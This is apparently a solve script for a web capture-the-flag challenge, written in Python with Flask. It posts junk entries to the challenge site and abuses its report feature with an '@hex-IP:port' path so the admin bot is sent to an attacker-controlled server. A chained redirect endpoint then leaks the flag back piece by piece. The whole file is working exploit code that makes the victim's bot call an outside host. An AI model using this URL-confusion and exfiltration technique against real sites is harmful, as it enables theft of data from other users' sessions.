#!/usr/bin/env python3
import random
import sys
import requests
import time
from flask import Flask, request, render_template, Response, redirect
import string
import base64

app = Flask(__name__, template_folder="")

if len(sys.argv) < 4:
    print("Usage: ./solve.py [CHALL_URL] [ATTACKER_IPV4] [ATTACKER_PORT]")
    sys.exit()

chall_url = sys.argv[1]
if chall_url[-1] == "/":
    chall_url = chall_url[:-1]

atq_ipv4 = sys.argv[2]
atq_ipv4arr = atq_ipv4.split(".")
atq_iphex = "0x"+''.join([hex(int(n))[2:].zfill(2) for n in atq_ipv4arr])
print(atq_iphex)

atq_port = sys.argv[3]

letters = string.ascii_letters

print("Creating posts")
posts = []
for i in range(10):
    title = ''.join(random.choice(letters) for i2 in range(3))
    msg = ''.join(random.choice(letters) for i2 in range(8))
    username = ''.join(random.choice(letters) for i2 in range(3))
    res = requests.post(chall_url+"/new_post", data={"username":username,"title":title,"body":msg})
    post_id = res.url[-36:]
    print("created "+post_id)
    posts.append(msg)
print("Created 10 posts")

print("Sending report")
requests.post(chall_url+"/report", data={"path":"@"+atq_iphex+":"+atq_port+"/"+post_id})
flag = "I.was.wondering.about.the.flag.tho..I.think.that..EPFL."
#flag = "Thanks.for.visiting.my.f"

i = "0"

@app.route("/report")
def rereport():
    print("received rereport!")
    global flag
    global i
    flag = request.args.get('flag')
    i = request.args.get('i')
    requests.post(chall_url+"/report", data={"path":"@"+atq_iphex+":"+atq_port+"/"+post_id})
    return {"status":"saul goodman"}

@app.route("/redirect")
def redirectfunc():
    n = request.args.get('n')
    data = request.args.get('data')
    dest = base64.b64decode(data).decode('utf-8')
    print(dest)
    if (int(n) < 19):
        return redirect("/redirect?n="+str(int(n)+1)+"&data="+data, code=302)
    else:
        return redirect(dest, code=302)


@app.route("/<path:junk>")
def index(junk):
    return render_template("solve.html",query='|'.join(posts), host="http://"+atq_ipv4+":"+atq_port, flag=flag, i=i)


app.run(host="0.0.0.0", port=atq_port)
